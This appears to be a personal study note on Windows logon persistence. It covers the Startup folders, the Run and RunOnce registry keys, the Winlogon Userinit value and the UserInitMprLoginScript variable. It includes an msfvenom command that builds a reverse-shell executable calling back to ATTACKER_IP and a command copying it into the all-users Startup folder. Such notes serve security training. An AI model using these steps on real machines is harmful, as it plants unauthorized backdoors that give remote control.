#windows #cybersecurity 

### Startup folder
Each user has a folder under
`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where we can put executables to run at startup

If we want that every user runs the payload at startup we have to use the folder
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

Let's generate a reverse shell payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

Copy the file in the folder

```powershell
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Then sign out and login

### Run / RunOnce
We can use the following registry entry to specify application to run at logon
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

HKCU = current user
HKLM = everyone

![[mybackdoor.png]]


### Winlogon
Windows component that loads the user profile after authentication.

`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.


![[Pasted image 20240722092253.png]]

We can modify the userinit entry with our reverse shell program.


### Logon Scripts
The `userninit.exe` load the user profile and checks for a variable called `UserInitMprLoginScript`

![[Pasted image 20240722093125.png]]

We can modify it to run a reverse shell on logon